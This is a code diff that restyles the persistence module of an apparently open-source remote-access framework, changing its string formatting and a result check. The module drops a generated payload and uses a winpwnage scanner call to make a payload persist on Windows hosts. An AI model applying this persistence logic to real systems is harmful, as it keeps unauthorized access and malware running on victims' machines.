@@ -79,14 +79,15 @@ class Persistence(PupyModule):
             shared=args.shared
         )
 
-        self.success("Generating the payload with the current config from {} - size={}".format(
-            tpl, len(exebuff)))
+        self.success(
+            f"Generating the payload with the current config from {tpl} - size={len(exebuff)}"
+        )
 
         drop_path, conf_path, method = drop(exebuff, args.shared)
         if drop_path and conf_path and method:
-            self.success('Dropped: {} Method: {} Config: {}'.format(drop_path, method, conf_path))
+            self.success(f'Dropped: {drop_path} Method: {method} Config: {conf_path}')
         elif method:
-            self.error('Failed: {}'.format(method))
+            self.error(f'Failed: {method}')
         else:
             self.error('Couldn\'t make service persistent.')
 
@@ -138,10 +139,9 @@ class Persistence(PupyModule):
                 return
 
         persist = self.client.remote('winpwnage.core.scanner', 'function', False)
-        result = persist(uac=False, persist=True, execute=False).run(
+        if result := persist(uac=False, persist=True, execute=False).run(
             id=method, payload=args.payload, name=name, add=not args.remove
-        )
-        if not result:
-            self.error('Nothing done, check if the id is on the list')
-        else:
+        ):
             self.parse_result(result, get_method_id=False)
+        else:
+            self.error('Nothing done, check if the id is on the list')
